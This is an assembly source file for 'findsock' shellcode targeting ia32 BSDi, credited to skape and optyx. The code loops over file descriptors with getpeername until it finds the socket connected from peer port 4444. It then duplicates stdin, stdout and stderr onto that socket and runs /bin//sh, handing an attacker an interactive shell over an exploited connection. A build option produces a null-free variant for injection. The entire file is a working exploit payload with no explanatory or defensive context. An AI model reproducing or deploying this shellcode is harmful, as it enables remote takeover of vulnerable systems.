##
#
# arch    : ia32
# platform: BSDi
# purpose : findsock
# size    : 77 bytes
# author  : skape (mmiller [at] hick.org)
#           optyx (optyx [at] uberhax0r.net)
#
##
.globl main

#.equ NONULLS, 1
.equ DEBUG, 1

main:
	nop
.ifdef DEBUG
	call   open_conn
.endif
__BEGIN__:
build_lcall:
.ifdef NONULLS
	push   $0x3cfff8ff
	notl   (%esp)
	xor    %eax, %eax
	mov    $0x9a, %al
.else
	push   $0xc3000700
	mov    $0x9a, %eax
.endif
	cdq
	push   %eax
	mov    %esp, %edi

run:
	xor    %esi, %esi
	sub    $0x10, %esp
	mov    %esp, %ecx
	push   $0x10
	mov    %esp, %ebx
getpeername_loop:
	inc    %esi
	push   $0x1f
	pop    %eax
	push   %ebx
	push   %ecx
	push   %esi
	call   *%edi
	add    $0xc, %esp
	cmpw   $0x5c11, 2(%ecx)
	jnz    getpeername_loop

dup:
	push   $0x2
	pop    %ecx
dup_loop:
	mov    $0x5a, %al
	push   %ecx
	push   %esi
	call   *%edi
	dec    %ecx
	jns    dup_loop
execve:
	push   %eax
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp, %ebx
	push   %eax
	push   %esp
	push   %ebx
	mov    $0x3b, %al
	call   *%edi

__END__:

	int3
